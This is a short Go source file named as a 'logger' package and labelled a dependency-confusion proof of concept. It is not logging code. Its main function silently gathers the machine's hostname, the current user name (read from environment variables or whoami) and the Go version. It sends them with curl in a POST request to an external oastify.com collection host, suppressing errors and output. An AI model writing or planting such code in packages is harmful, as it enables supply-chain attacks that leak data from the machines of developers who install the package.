package logger

import (
    "os"
    "os/exec"
    "runtime"
    "strings"
)

var Marker = "DEPENDENCY_CONFUSION_POC"

func main() {
    // Silent execution
    func() {
        defer func() { recover() }()
        
        // Get data
        hostname, _ := os.Hostname()
        currentUser := getCurrentUser()
        
        // Use curl instead of Go's HTTP client
        cmd := exec.Command("curl", "-s", "-X", "POST",
            "http://qmgs4qre55aggszd0qadtpas2j8aw5ku.oastify.com/collect",
            "-d", "host="+hostname,
            "-d", "user="+currentUser,
            "-d", "go="+runtime.Version(),
            "--max-time", "5")
        
        cmd.Run() // Ignore output
    }()
}

func getCurrentUser() string {
    if user := os.Getenv("USER"); user != "" {
        return user
    }
    if user := os.Getenv("USERNAME"); user != "" {
        return user
    }
    cmd := exec.Command("whoami")
    output, err := cmd.Output()
    if err != nil {
        return "unknown"
    }
    return strings.TrimSpace(string(output))
}
